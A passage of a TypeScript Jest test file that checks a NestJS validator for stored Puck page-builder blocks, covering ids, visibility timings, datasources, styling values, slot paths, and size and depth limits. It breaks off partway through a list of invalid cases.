import { BadRequestException } from '@nestjs/common';

import {
  ApiBlock,
  ApiBlockStyling,
  apiBlockStylingKeys,
  filterPuckBlocks,
  isStoredPuckBlocks,
  isStoredPuckRegistry,
  MAX_PUCK_BLOCK_CONSUMES,
  MAX_PUCK_BLOCKS_DEPTH,
  MAX_PUCK_BLOCKS_LENGTH,
  MAX_PUCK_REGISTRY_COMPONENTS,
  MAX_PUCK_SCRIPT_LENGTH,
  orderPuckChildren,
  parsePuckBlocks,
  parsePuckDocument,
  parsePuckRegistry,
  PuckBlocksError,
  readStoredPuckBlocks,
  readStoredPuckRegistry,
} from './puck-blocks';

const block = (
  id: string,
  props: Record<string, unknown> = {},
  extra: Partial<ApiBlock> = {}
): ApiBlock => ({
  id,
  kind: 'puck',
  type: 'Heading',
  props,
  ...extra,
});

const chain = (levels: number): ApiBlock[] => {
  let deepest = block('level-1');

  for (let level = 2; level <= levels; level++) {
    deepest = block(`level-${level}`, {}, { children: [deepest] });
  }

  return [deepest];
};

const fullStyling: ApiBlockStyling = {
  typography: 'h2',
  textAlign: 'center',
  color: 'primary.main',
  fontWeight: 'bold',
  textTransform: 'uppercase',
  background: '#1a1a1a80',
  backgroundImage: 'image-1',
  backgroundSize: 'contain',
  backgroundPosition: 'left top',
  overlay: 'common.black',
  overlayOpacity: 40,
  margin: { top: 2, bottom: '12px', left: '1.5rem', right: '5lvh' },
  padding: { top: 1, right: 1.5, bottom: '8px', left: 0 },
  border: { width: { top: 1, bottom: 2 }, style: 'dashed', color: '#fff' },
  borderRadius: { topLeft: 1, bottomRight: '8px' },
  cornerShape: 'squircle',
  minHeight: '50vh',
  maxWidth: 'md',
  shadow: 24,
  opacity: 100,
};

describe('parsePuckBlocks', () => {
  it('stores a valid tree as it is', () => {
    const blocks = [
      block(
        'grid-1',
        { items: [{ content: [] }, { content: [] }], gap: 2 },
        {
          locked: true,
          grouped: true,
          visibility: {
            disabled: false,
            timings: {
              from: '2026-01-05T08:00:00.000Z',
              weekdays: ['Monday'],
              timeOfDay: { from: '08:00', to: '12:00' },
            },
            breakpoints: ['md'],
          },
          styling: {
            xs: fullStyling,
            md: { color: '#000000', margin: { top: 4 } },
          },
          datasources: {
            article: { type: 'list' },
            page: { type: 'single', id: 'page-1' },
            image: { type: 'multiple', ids: ['image-1', 'image-2'] },
            userSubscription: { type: 'uniqueList' },
          },
          children: [
            block(
              'heading-1',
              { text: 'Hello' },
              { puckSlot: 'items[0].content' }
            ),
            block('heading-2', {}, { puckSlot: 'items[1].content' }),
          ],
        }
      ),
      block('heading-3'),
    ];

    expect(parsePuckBlocks(blocks)).toEqual(blocks);
  });

  it('accepts an empty list', () => {
    expect(parsePuckBlocks([])).toEqual([]);
  });

  it('keeps how many records a block consumes itself from its own lists', () => {
    const blocks = [
      block(
        'events-1',
        {},
        {
          datasources: { event: { type: 'list' } },
          consumes: MAX_PUCK_BLOCK_CONSUMES,
        }
      ),
      block('events-2', {}, { consumes: 1 }),
    ];

    expect(parsePuckBlocks(blocks)).toEqual(blocks);
  });

  it('accepts a component prop named type inside the props', () => {
    const blocks = [block('input-1', { type: 'email', name: 'EMAIL' })];

    expect(parsePuckBlocks(blocks)).toEqual(blocks);
  });

  it('keeps null props inside the props', () => {
    const blocks = [block('text-1', { text: null })];

    expect(parsePuckBlocks(blocks)).toEqual(blocks);
  });

  it('stores timings given as dates as ISO date times in UTC', () => {
    const [{ visibility }] = parsePuckBlocks([
      block('a', {}, {
        visibility: {
          timings: {
            from: new Date('2026-01-05T08:00:00Z'),
            to: new Date('2026-01-06T08:00:00Z'),
          },
        },
      } as unknown as Partial<ApiBlock>),
    ]);

    expect(visibility?.timings).toEqual({
      from: '2026-01-05T08:00:00.000Z',
      to: '2026-01-06T08:00:00.000Z',
    });
  });

  it('stores timings with an offset in UTC', () => {
    const [{ visibility }] = parsePuckBlocks([
      block(
        'a',
        {},
        {
          visibility: {
            timings: {
              from: '2026-11-01T10:00:00+01:00',
              to: '2026-11-02T08:00Z',
            },
          },
        }
      ),
    ]);

    expect(visibility?.timings).toEqual({
      from: '2026-11-01T09:00:00.000Z',
      to: '2026-11-02T08:00:00.000Z',
    });
  });

  it('drops the values a GraphQL client sent as null', () => {
    expect(
      parsePuckBlocks([
        {
          id: 'a',
          kind: 'puck',
          type: 'Grid',
          props: {},
          locked: null,
          grouped: null,
          puckSlot: null,
          styling: {
            xs: { color: null, margin: { top: 1, left: null } },
            md: null,
          },
          datasources: {
            article: null,
            page: { type: 'single', id: 'page-1', ids: null },
          },
          visibility: {
            disabled: null,
            breakpoints: null,
            timings: { from: null, to: null, weekdays: null, timeOfDay: null },
          },
          children: null,
        },
      ])
    ).toEqual([
      {
        id: 'a',
        kind: 'puck',
        type: 'Grid',
        props: {},
        styling: { xs: { margin: { top: 1 } } },
        datasources: { page: { type: 'single', id: 'page-1' } },
        visibility: { timings: {} },
      },
    ]);
  });

  it('throws a bad request for invalid blocks', () => {
    expect(() => parsePuckBlocks(null)).toThrow(BadRequestException);
    expect(() => parsePuckBlocks(null)).toThrow(PuckBlocksError);
  });

  it.each([
    ['null', null, 'blocks must be a list'],
    ['puck data', { root: {}, content: [] }, 'blocks must be a list'],
    ['a block that is not an object', ['nope'], 'blocks[0] must be an object'],
    [
      'a puck component',
      [{ type: 'Heading', props: { id: 'a' } }],
      'blocks[0].kind must be one of puck, generated',
    ],
    [
      'a block without a kind',
      [{ id: 'a', type: 'Heading', props: {} }],
      'blocks[0].kind must be one of puck, generated',
    ],
    [
      'an unknown kind',
      [{ ...block('a'), kind: 'legacy' }],
      'blocks[0].kind must be one of puck, generated',
    ],
    [
      'a block without a type',
      [{ id: 'a', kind: 'puck', props: { text: 'Hello' } }],
      'blocks[0].type is required',
    ],
    [
      'a type that is not a string',
      [{ id: 'a', kind: 'puck', type: 1, props: {} }],
      'blocks[0].type must be a string',
    ],
    [
      'a block without props',
      [{ id: 'a', kind: 'puck', type: 'Heading' }],
      'blocks[0].props is required',
    ],
    [
      'props that are a list',
      [{ id: 'a', kind: 'generated', type: 'Hero', props: [] }],
      'blocks[0].props must be an object',
    ],
    [
      'the props stored as data',
      [{ ...block('a'), data: {} }],
      'blocks[0] must not have data',
    ],
    [
      'the slot stored as slot',
      [{ ...block('a'), slot: 'content' }],
      'blocks[0] must not have slot',
    ],
    [
      'a lock that is not a boolean',
      [{ ...block('a'), locked: 'yes' }],
      'blocks[0].locked must be a boolean',
    ],
    [
      'a group that is not a boolean',
      [{ ...block('a'), grouped: 'yes' }],
      'blocks[0].grouped must be a boolean',
    ],
    [
      'a visibility that is not an object',
      [{ ...block('a'), visibility: [] }],
      'blocks[0].visibility must be an object',
    ],
    [
      'datasources that are not an object',
      [{ ...block('a'), datasources: 'articles' }],
      'blocks[0].datasources must be an object',
    ],
    [
      'a styling that is not an object',
      [{ ...block('a'), styling: 'bold' }],
      'blocks[0].styling must be an object',
    ],
    [
      'a slot that is not a string',
      [{ ...block('a'), puckSlot: 1 }],
      'blocks[0].puckSlot must be a string',
    ],
    [
      'consumed records that are not a number',
      [{ ...block('a'), consumes: '6' }],
      'blocks[0].consumes must be a number',
    ],
    [
      'a fraction of a consumed record',
      [{ ...block('a'), consumes: 1.5 }],
      'blocks[0].consumes must be an integer',
    ],
    [
      'no consumed records',
      [{ ...block('a'), consumes: 0 }],
      'blocks[0].consumes must be at least 1',
    ],
    [
      'more consumed records than the cap',
      [{ ...block('a'), consumes: MAX_PUCK_BLOCK_CONSUMES + 1 }],
      `blocks[0].consumes must be at most ${MAX_PUCK_BLOCK_CONSUMES}`,
    ],
    [
      'children that are not a list',
      [{ ...block('a'), children: {} }],
      'blocks[0].children must be a list',
    ],
    [
      'an invalid child',
      [
        {
          ...block('a'),
          children: [block('b'), { kind: 'puck', type: 'Heading', props: {} }],
        },
      ],
      'blocks[0].children[1].id is required',
    ],
    ['an empty id', [block('')], 'blocks[0].id must not be empty'],
    [
      'a component inside the props',
      [
        block('a', {
          items: [{ content: [{ type: 'Text', props: { id: 't' } }] }],
        }),
      ],
      'blocks[0].props.items[0].content[0] must not be a component, nest it through children',
    ],
    [
      'block fields inside the props',
      [block('a', { visibility: { disabled: true } })],
      'blocks[0].props.visibility belongs on the block, not inside its props',
    ],
    [
      'a timing that is not a date',
      [{ ...block('a'), visibility: { timings: { from: 'banana' } } }],
      'blocks[0].visibility.timings.from must be a date time with a time zone',
    ],
    [
      'a timing without a time',
      [{ ...block('a'), visibility: { timings: { from: '2026-11-01' } } }],
      'blocks[0].visibility.timings.from must be a date time with a time zone',
    ],
    [
      'a timing on a day that does not exist',
      [
        {
          ...block('a'),
          visibility: { timings: { to: '2026-02-29T00:00:00Z' } },
        },
      ],
      'blocks[0].visibility.timings.to must be a valid date time',
    ],
    [
      'a timing that is an invalid date',
      [
        {
          ...block('a'),
          visibility: { timings: { from: new Date('banana') } },
        },
      ],
      'blocks[0].visibility.timings.from must be a valid date time',
    ],
    [
      'a timing that ends before it starts',
      [
        {
          ...block('a'),
          visibility: {
            timings: {
              from: '2026-11-05T00:00:00Z',
              to: '2026-11-01T00:00:00Z',
            },
          },
        },
      ],
      'blocks[0].visibility.timings.to must be after the start',
    ],
    [
      'a timing that ends when it starts',
      [
        {
          ...block('a'),
          visibility: {
            timings: {
              from: new Date('2026-11-01T00:00:00Z'),
              to: '2026-11-01T01:00:00+01:00',
            },
          },
        },
      ],
      'blocks[0].visibility.timings.to must be after the start',
    ],
    [
      'an unknown weekday',
      [{ ...block('a'), visibility: { timings: { weekdays: ['MON'] } } }],
      'blocks[0].visibility.timings.weekdays[0] must be one of Monday, Tuesday, Wednesday, Thursday, Friday, Saturday, Sunday',
    ],
    [
      'a daily window that is not HH:MM',
      [
        {
          ...block('a'),
          visibility: { timings: { timeOfDay: { from: '8', to: '09:00' } } },
        },
      ],
      'blocks[0].visibility.timings.timeOfDay.from must be a time of day as HH:MM',
    ],
    [
      'an unknown breakpoint',
      [{ ...block('a'), visibility: { breakpoints: ['xxl'] } }],
      'blocks[0].visibility.breakpoints[0] must be one of xs, sm, md, lg, xl',
    ],
    [
      'a disabled flag that is not a boolean',
      [{ ...block('a'), visibility: { disabled: 'true' } }],
      'blocks[0].visibility.disabled must be a boolean',
    ],
    [
      'an unknown datasource type',
      [{ ...block('a'), datasources: { article: { type: 'all' } } }],
      'blocks[0].datasources.article.type must be one of list, uniqueList, slot, single, multiple',
    ],
    [
      'a single datasource without an id',
      [{ ...block('a'), datasources: { article: { type: 'single' } } }],
      'blocks[0].datasources.article.id is required',
    ],
    [
      'a list datasource with ids',
      [
        {
          ...block('a'),
          datasources: { article: { type: 'list', ids: ['article-1'] } },
        },
      ],
      'blocks[0].datasources.article must not have ids',
    ],
    [
      'a user subscription datasource that picks records',
      [
        {
          ...block('a'),
          datasources: { userSubscription: { type: 'multiple', ids: [] } },
        },
      ],
      'blocks[0].datasources.userSubscription.type must be one of list, uniqueList, slot',
    ],
    [
      'resolved datasource data',
      [{ ...block('a'), datasources: { page: { type: 'list', data: [] } } }],
      'blocks[0].datasources.page must not have data',
    ],
    [
      'a list datasource that limits how many it loads',
      [{ ...block('a'), datasources: { article: { type: 'list', take: 3 } } }],
      'blocks[0].datasources.article must not have take',
    ],
    [
      'an image datasource loading the latest images',
      [{ ...block('a'), datasources: { image: { type: 'list' } } }],
      'blocks[0].datasources.image.type must be one of single, multiple',
    ],
    [
      'an image datasource without duplicates',
      [{ ...block('a'), datasources: { image: { type: 'uniqueList' } } }],
      'blocks[0].datasources.image.type must be one of single, multiple',
    ],
    [
      'an image datasource taken from the parent',
      [{ ...block('a'), datasources: { image: { type: 'slot' } } }],
      'blocks[0].datasources.image.type must be one of single, multiple',
    ],
    [
      'two blocks with the same id',
      [block('a'), block('b'), block('a')],
      'blocks[2].id must be unique in the document',
    ],
    [
      'a child with the id of its parent',
      [block('a', {}, { children: [block('b'), block('a')] })],
      'blocks[0].children[1].id must be unique in the document',
    ],
    [
      'children of different parents with the same id',
      [
        block('a', {}, { children: [block('c')] }),
        block('b', {}, { children: [block('c')] }),
      ],
      'blocks[1].children[0].id must be unique in the document',
    ],
    [
      'an unknown datasource model',
      [{ ...block('a'), datasources: { author: { type: 'list' } } }],
      'blocks[0].datasources must not have author',
    ],
    [
      'a huge slot index',
      [{ ...block('a'), puckSlot: 'items[4294967294].content' }],
      'blocks[0].puckSlot must be a slot path like items[0].content',
    ],
    [
      'a colour that is neither a theme colour nor hex',
      [{ ...block('a'), styling: { md: { color: 'red' } } }],
      'blocks[0].styling.md.color must be a theme colour like primary.main or a hex colour like #1a1a1a',
    ],
    [
      'a negative margin',
      [{ ...block('a'), styling: { md: { margin: { top: -1 } } } }],
      'blocks[0].styling.md.margin.top must be theme spacing units or a css length like 12px, 1.5rem or 50vh',
    ],
    [
      'a padding in an unknown unit',
      [{ ...block('a'), styling: { md: { padding: { left: '1foo' } } } }],
      'blocks[0].styling.md.padding.left must be theme spacing units or a css length like 12px, 1.5rem or 50vh',
    ],
    [
      'a border width as a string',
      [
        {
          ...block('a'),
          styling: { md: { border: { width: { top: '2px' } } } },
        },
      ],
      'blocks[0].styling.md.border.width.top must be a number',
    ],
    [
      'an unknown border style',
      [{ ...block('a'), styling: { md: { border: { style: 'double' } } } }],
      'blocks[0].styling.md.border.style must be one of solid, dashed, dotted',
    ],
    [
      'a corner radius in an unknown unit',
      [
        {
          ...block('a'),
          styling: { md: { borderRadius: { topLeft: '8foo' } } },
        },
      ],
      'blocks[0].styling.md.borderRadius.topLeft must be theme spacing units or a css length like 12px, 1.5rem or 50vh',
    ],
    [
      'a minimum height in percent',
      [{ ...block('a'), styling: { md: { minHeight: '50%' } } }],
      'blocks[0].styling.md.minHeight must be pixels like 320px or viewport height like 50vh',
    ],
    [
      'a maximum width at the smallest breakpoint',
      [{ ...block('a'), styling: { md: { maxWidth: 'xs' } } }],
      'blocks[0].styling.md.maxWidth must be a breakpoint (sm, md, lg, xl), pixels like 640px or percent like 80%',
    ],
    [
      'a shadow above the highest elevation',
      [{ ...block('a'), styling: { md: { shadow: 25 } } }],
      'blocks[0].styling.md.shadow must be at most 24',
    ],
    [
      'a shadow between elevations',
      [{ ...block('a'), styling: { md: { shadow: 1.5 } } }],
      'blocks[0].styling.md.shadow must be an integer',
    ],
    [
      'an opacity above 100 percent',
      [{ ...block('a'), styling: { md: { opacity: 101 } } }],
      'blocks[0].styling.md.opacity must be at most 100',
    ],
    [
      'a background position in the wrong order',
      [{ ...block('a'), styling: { md: { backgroundPosition: 'top left' } } }],
      'blocks[0].styling.md.backgroundPosition must be one of left top, center top, right top, left center, center center, right center, left bottom, center bottom, right bottom',
    ],
    [
      'an unknown styling key',
      [{ ...block('a'), styling: { md: { fontSize: '2rem' } } }],
      'blocks[0].styling.md must not have fontSize',
    ],
    [
      'a styling that is not split by breakpoint',
      [{ ...block('a'), styling: { color: 'primary.main' } }],
      'blocks[0].styling must not have color',
    ],
    [
      'a styling at an unknown breakpoint',
      [{ ...block('a'), styling: { xxl: { color: 'primary.main' } } }],
      'blocks[0].styling must not have xxl',
    ],
    [
      'a breakpoint styling that is not an object',
      [{ ...block('a'), styling: { sm: 'bold' } }],
      'blocks[0].styling.sm must be an object',
    ],
  ])('rejects %s', (_, value, message) => {
    expect(() => parsePuckBlocks(value)).toThrow(
      `Puck blocks are invalid: ${message}.`
    );
  });

  it('rejects blocks larger than the size cap', () => {
    const blocks = [
      block('text-1', { text: 'x'.repeat(MAX_PUCK_BLOCKS_LENGTH) }),
    ];

    expect(() => parsePuckBlocks(blocks)).toThrow('Puck blocks are too large');
  });

  it('accepts children nested as deep as the depth cap', () => {
    const blocks = chain(MAX_PUCK_BLOCKS_DEPTH);

    expect(parsePuckBlocks(blocks)).toEqual(blocks);
  });

  it('rejects children nested deeper than the depth cap', () => {
    expect(() => parsePuckBlocks(chain(MAX_PUCK_BLOCKS_DEPTH + 1))).toThrow(
      'Puck blocks are nested too deep'
    );
  });

  it('rejects data nested deeper than the depth cap', () => {
    let nested: Record<string, unknown> = { leaf: true };

    for (let level = 0; level < MAX_PUCK_BLOCKS_DEPTH; level++) {
      nested = { nested };
    }

    expect(() => parsePuckBlocks([block('deep-1', { nested })])).toThrow(
      'Puck blocks are nested too deep'
    );
  });

  it('rejects absurdly deep input before validating its shape', () => {
    let nested: unknown = [];

    for (let level = 0; level < 100_000; level++) {
      nested = [nested];
    }

    expect(() => parsePuckBlocks(nested)).toThrow(
      'Puck blocks are nested too deep'
    );
  });
});

describe('apiBlockStylingKeys', () => {
  it('lists every key the editor stores in the styling tab', () => {
    expect(apiBlockStylingKeys).toEqual(Object.keys(fullStyling));
  });
});

const storedBlock = (extra: Record<string, unknown> = {}) => ({
  id: 'Title-1',
  kind: 'puck',
  type: 'Title',
  props: {},
  ...extra,
});

const storedComponent = { type: 'Title', props: { id: 'Title-9' } };

const everyStylingKey = {
  typography: 'h2',
  textAlign: 'center',
  color: 'primary.main',
  fontWeight: 'bold',
  textTransform: 'uppercase',
  background: '#1a1a1a80',
  backgroundImage: 'image-1',
  backgroundSize: 'contain',
  backgroundPosition: 'left top',
  overlay: 'common.black',
  overlayOpacity: 40,
  margin: { top: 2, bottom: '12px', left: '1.5rem', right: '5lvh' },
  padding: { top: 1, right: 1.5, bottom: '8px', left: 0 },
  border: { width: { top: 1, bottom: 2 }, style: 'dashed', color: '#fff' },
  borderRadius: { topLeft: 1, bottomRight: '8px' },
  cornerShape: 'squircle',
  minHeight: '50vh',
  maxWidth: 'md',
  shadow: 24,
  opacity: 100,
};

const timed = (timings: unknown) => [storedBlock({ visibility: { timings } })];

const sourced = (datasources: unknown) => [storedBlock({ datasources })];

const styled = (styling: unknown) => [
  storedBlock({ styling: { xs: styling } }),
];

const slotted = (puckSlot: unknown) => [
  storedBlock({ children: [storedBlock({ id: 'Title-2', puckSlot })] }),
];

const storedBlockFormat: Record<'valid' | 'invalid', [string, unknown][]> = {
  valid: [
    ['an empty list', []],
    ['a block', [storedBlock()]],
    [
      'locked and unlocked blocks',
      [
        storedBlock({ locked: true }),
        storedBlock({ id: 'Title-2', locked: false }),
      ],
    ],
    [
      'grouped and ungrouped blocks',
      [
        storedBlock({ grouped: true }),
        storedBlock({ id: 'Title-2', grouped: false }),
      ],
    ],
    [
      'a generated block',
      [storedBlock({ kind: 'generated', type: 'HeroBanner' })],
    ],
    [
      'a type prop inside the props',
      [storedBlock({ props: { type: 'submit' } })],
    ],
    [
      'rich text nodes inside the props',
      [
        storedBlock({
          props: {
            richText: [{ type: 'paragraph', children: [{ text: 'Hi' }] }],
          },
        }),
      ],
    ],
    [
      'empty slots inside the props',
      [storedBlock({ props: { items: [{ content: [] }], content: [] } })],
    ],
    ['an empty visibility', [storedBlock({ visibility: {} })]],
    [
      'a full visibility',
      [
        storedBlock({
          visibility: {
            disabled: false,
            timings: {
              from: '2026-11-01T08:00:00.000Z',
              to: '2026-11-02T08:00:00.000Z',
              weekdays: ['Monday', 'Sunday'],
              timeOfDay: { from: '00:00', to: '23:59' },
            },
            breakpoints: ['xs', 'xl'],
          },
        }),
      ],
    ],
    ['an empty timing', timed({})],
    [
      'a timing starting on a leap day',
      timed({ from: '2028-02-29T00:00:00.000Z' }),
    ],
    [
      'a daily window over midnight',
      timed({ timeOfDay: { from: '22:00', to: '02:00' } }),
    ],
    [
      'every datasource type',
      sourced({
        article: { type: 'list' },
        page: { type: 'uniqueList' },
        event: { type: 'single', id: 'event-1' },
        image: { type: 'multiple', ids: ['image-1'] },
        memberPlan: { type: 'slot' },
        userSubscription: { type: 'uniqueList' },
      }),
    ],
    [
      'a single datasource the editor has not picked yet',
      sourced({ article: { type: 'single', id: '' } }),
    ],
    [
      'a multiple datasource without picks',
      sourced({ article: { type: 'multiple', ids: [] } }),
    ],
    ['an empty datasources object', sourced({})],
    ['an empty styling', styled({})],
    ['every styling key', styled(everyStylingKey)],
    [
      'spacing in theme units and pixels',
      styled({
        margin: { top: 0, right: 0.5, bottom: '0px', left: '12.5px' },
        padding: { top: 3 },
        borderRadius: { topRight: 0, bottomLeft: '4px' },
      }),
    ],
    [
      'lengths in pixels, viewport height and percent',
      styled({ minHeight: '320px', maxWidth: '80%' }),
    ],
    ['a maximum width in pixels', styled({ maxWidth: '640.5px' })],
    [
      'theme colours of tenant palette groups',
      styled({ color: 'brand.main', background: 'text.primary' }),
    ],
    [
      'hex colours in every length',
      styled({
        color: '#fff',
        background: '#ffff',
        overlay: '#1A1A1A',
        border: { color: '#1a1a1a80' },
      }),
    ],
    [
      'the lowest effects',
      styled({ shadow: 0, opacity: 0, overlayOpacity: 0 }),
    ],
    [
      'a child in the content slot',
      [storedBlock({ children: [storedBlock({ id: 'Title-2' })] })],
    ],
    [
      'a child in the slot of a generated block',
      [
        storedBlock({
          kind: 'generated',
          type: 'HeroBanner',
          children: [storedBlock({ id: 'Title-2', puckSlot: 'hero.body' })],
        }),
      ],
    ],
    ['a child in a named slot', slotted('items[0].content')],
    ['a child at the highest slot index', slotted('items[999].content')],
    ['a child in a nested slot', slotted('layout.columns[1][2].content')],
    [
      'nested children',
      [
        storedBlock({
          children: [
            storedBlock({
              id: 'Title-2',
              children: [storedBlock({ id: 'Title-3' })],
            }),
          ],
        }),
      ],
    ],
  ],
  invalid: [
    ['no list', null],
    ['puck data', { root: {}, content: [] }],
    ['a block that is not an object', ['Title']],
    ['a puck component', [storedComponent]],
    ['an empty id', [storedBlock({ id: '' })]],
    ['an id that is not a string', [storedBlock({ id: 1 })]],
    ['an empty type', [storedBlock({ type: '' })]],
    ['a block without a kind', [{ id: 'Title-1', type: 'Title', props: {} }]],
    ['an unknown kind', [storedBlock({ kind: 'Title' })]],
    ['a kind that is not a string', [storedBlock({ kind: 1 })]],
    ['a block without a type', [{ id: 'Title-1', kind: 'puck', props: {} }]],
    [
      'the type inside the props',
      [{ id: 'Title-1', kind: 'puck', props: { type: 'Title' } }],
    ],
    ['a block without props', [{ id: 'Title-1', kind: 'puck', type: 'Title' }]],
    ['props that are a list', [storedBlock({ props: [] })]],
    ['the props stored as data', [storedBlock({ data: {} })]],
    [
      'the slot stored as slot',
      [storedBlock({ children: [storedBlock({ id: 'Title-2', slot: 'a' })] })],
    ],
    ['an unknown block key', [storedBlock({ zones: {} })]],
    [
      'two blocks with the same id',
      [storedBlock(), storedBlock({ id: 'Title-2' }), storedBlock()],
    ],
    [
      'a grandchild with the id of the root',
      [
        storedBlock({
          children: [storedBlock({ id: 'Title-2', children: [storedBlock()] })],
        }),
      ],
    ],
    ['a lock that is not a boolean', [storedBlock({ locked: 'yes' })]],
    ['a group that is not a boolean', [storedBlock({ grouped: 'yes' })]],
    [
      'a component inside the props',
      [storedBlock({ props: { content: [storedComponent] } })],
    ],
    [
      'a component next to other items inside the props',
      [storedBlock({ props: { content: [{}, storedComponent] } })],
    ],
    [
      'a component deep inside the props',
      [
        storedBlock({
          props: { items: [{ card: { teaser: storedComponent } }] },
        }),
      ],
    ],
    ['the id inside the props', [storedBlock({ props: { id: 'Title-1' } })]],
    ['the lock inside the props', [storedBlock({ props: { locked: true } })]],
    ['the group inside the props', [storedBlock({ props: { grouped: true } })]],
    [
      'the visibility inside the props',
      [storedBlock({ props: { visibility: {} } })],
    ],
    [
      'datasources inside the props',
      [storedBlock({ props: { datasources: {} } })],
    ],
    ['styling inside the props', [storedBlock({ props: { styling: {} } })]],
    ['a visibility that is a list', [storedBlock({ visibility: [] })]],
    [
      'a disabled flag that is not a boolean',
      [storedBlock({ visibility: { disabled: 'true' } })],
    ],
    [
      'an unknown breakpoint',
      [storedBlock({ visibility: { breakpoints: ['xxl'] } })],
    ],
    [
      'an unknown visibility key',
      [storedBlock({ visibility: { hidden: true } })],
    ],
    ['timings that are not an object', timed('always')],
    ['a start without a time', timed({ from: '2026-11-01' })],
    ['a start without a time zone', timed({ from: '2026-11-01T10:00:00' })],
    [
      'a start on a day that does not exist',
      timed({ from: '2026-02-29T00:00:00Z' }),
    ],
    [
      'a start in a month that does not exist',
      timed({ from: '2026-13-01T00:00:00Z' }),
    ],
    ['an end that is not a date', timed({ to: 'banana' })],
    ['an end that is a timestamp', timed({ to: 1793520000000 })],
    ['an end that is an invalid date', timed({ to: new Date(Number.NaN) })],
    [
      'an end before the start',
      timed({ from: '2026-11-05T00:00:00Z', to: '2026-11-01T00:00:00Z' }),
    ],
    [
      'an end at the start',
      timed({ from: '2026-11-01T00:00:00Z', to: '2026-11-01T00:00:00.000Z' }),
    ],
    [
      'an end at the start given as dates',
      timed({
        from: new Date('2026-11-01T00:00:00Z'),
        to: new Date('2026-11-01T00:00:00Z'),
      }),
    ],
    ['an abbreviated weekday', timed({ weekdays: ['MON'] })],
    ['a weekday in capitals', timed({ weekdays: ['MONDAY'] })],
    ['weekdays that are not a list', timed({ weekdays: 'Monday' })],
    ['a daily window without an end', timed({ timeOfDay: { from: '08:00' } })],
    [
      'a daily window ending after midnight',
      timed({ timeOfDay: { from: '08:00', to: '24:00' } }),
    ],
    [
      'a daily window with seconds',
      timed({ timeOfDay: { from: '08:00:00', to: '09:00' } }),
    ],
    ['an unknown timing key', timed({ timeZone: 'Europe/Zurich' })],
    ['datasources that are not an object', sourced('articles')],
    ['a datasource that is not an object', sourced({ article: 'list' })],
    ['an unknown datasource type', sourced({ article: { type: 'all' } })],
    ['an unknown datasource model', sourced({ author: { type: 'list' } })],
    [
      'a single datasource without an id',
      sourced({ article: { type: 'single' } }),
    ],
    [
      'a single datasource with ids',
      sourced({ article: { type: 'single', id: 'a', ids: ['a'] } }),
    ],
    [
      'a multiple datasource with ids that are not strings',
      sourced({ article: { type: 'multiple', ids: [1] } }),
    ],
    [
      'a multiple datasource without ids',
      sourced({ article: { type: 'multiple' } }),
    ],
    [
      'a list datasource with an id',
      sourced({ article: { type: 'uniqueList', id: 'article-1' } }),
    ],
    [
      'a list datasource that limits how many it loads',
      sourced({ page: { type: 'uniqueList', take: 2 } }),
    ],
    [
      'an image datasource of the latest images',
      sourced({ image: { type: 'list' } }),
    ],
    [
      'an image datasource without duplicates',
      sourced({ image: { type: 'uniqueList' } }),
    ],
    [
      'an image datasource from the parent',
      sourced({ image: { type: 'slot' } }),
    ],
    [
      'a user subscription datasource that picks records',
      sourced({ userSubscription: { type: 'single', id: 'subscription-1' } }),
    ],
    [
      'the datasource data the website resolved',
      sourced({ article: { type: 'list', data: [{ id: 'article-1' }] } }),
    ],
    [
      'datasource data that is not a list',
      sourced({ article: { type: 'list', data: {} } }),
    ],
    ['styling that is not an object', styled('red')],
    ['styling that is a list', styled([])],
    ['an unknown styling key', styled({ fontSize: '2rem' })],
    ['a css property', styled({ 'font-size': '12px' })],
    ['an empty typography variant', styled({ typography: '' })],
    ['a typography that is not a variant name', styled({ typography: {} })],
    ['an unknown text alignment', styled({ textAlign: 'justify' })],
    ['a named colour', styled({ color: 'red' })],
    ['a colour function', styled({ background: 'rgb(0, 0, 0)' })],
    ['a hex colour of the wrong length', styled({ overlay: '#12345' })],
    ['a theme colour without a shade', styled({ background: 'primary' })],
    ['a theme colour path that is too deep', styled({ color: 'a.b.c' })],
    ['a numeric font weight', styled({ fontWeight: 700 })],
    ['an unknown font weight', styled({ fontWeight: 'black' })],
    ['an unknown letter case', styled({ textTransform: 'smallcaps' })],
    ['an empty background image', styled({ backgroundImage: '' })],
    ['an unknown background size', styled({ backgroundSize: 'fill' })],
    ['an unknown background position', styled({ backgroundPosition: 'top' })],
    ['an overlay opacity below 0', styled({ overlayOpacity: -1 })],
    ['an overlay opacity above 100', styled({ overlayOpacity: 101 })],
    ['margin as a single number', styled({ margin: 2 })],
    ['margin on an unknown side', styled({ margin: { start: 2 } })],
    ['a negative margin', styled({ margin: { top: -2 } })],
    ['margin in an unknown unit', styled({ margin: { top: '1foo' } })],
    [
      'padding with a negative pixel value',
      styled({ padding: { top: '-4px' } }),
    ],
    [
      'a border width in pixels as a string',
      styled({ border: { width: { top: '1px' } } }),
    ],
    ['a negative border width', styled({ border: { width: { top: -1 } } })],
    ['an unknown border style', styled({ border: { style: 'double' } })],
    [
      'a border colour that is not a colour',
      styled({ border: { color: 'blue' } }),
    ],
    ['an unknown border key', styled({ border: { radius: 2 } })],
    [
      'a corner radius on an unknown corner',
      styled({ borderRadius: { top: 1 } }),
    ],
    ['a negative corner radius', styled({ borderRadius: { topLeft: -1 } })],
    [
      'a corner radius with a negative length',
      styled({ borderRadius: { topLeft: '-50%' } }),
    ],
    ['an unknown corner shape', styled({ cornerShape: 'superellipse(2)' })],
    [
      'a corner shape per corner',
      styled({ cornerShape: { topLeft: 'bevel' } }),
    ],
    ['a minimum height without a unit', styled({ minHeight: '320' })],
    ['a minimum height as a number', styled({ minHeight: 320 })],
    ['a minimum height in percent', styled({ minHeight: '50%' })],
    ['a maximum width in viewport height', styled({ maxWidth: '50vh' })],
    ['a maximum width at the smallest breakpoint', styled({ maxWidth: 'xs' })],
    ['a maximum width at an unknown breakpoint', styled({ maxWidth: 'xxl' })],
    ['a negative shadow', styled({ shadow: -1 })],
    ['a shadow above 24', styled({ shadow: 25 })],
    ['a fractional shadow', styled({ shadow: 2.5 })],
    ['an opacity above 100', styled({ opacity: 120 })],
    ['an opacity as a string', styled({ opacity: '50' })],
    ['a slot that is not a string', slotted(1)],
    ['an empty slot', slotted('')],
    ['a slot starting with a dot', slotted('.content')],
    ['a slot with an empty segment', slotted('items[0]..content')],
    ['a slot with a named index', slotted('items[a].content')],
    ['a slot starting with an index', slotted('[0].content')],
    ['a slot with an unclosed index', slotted('items[0.content')],
    ['a slot index past the highest', slotted('items[1000].content')],
    ['a huge slot index', slotted('items[4294967294].content')],
    ['children that are not a list', [storedBlock({ children: {} })]],
    [
      'an invalid child',
      [
        storedBlock({
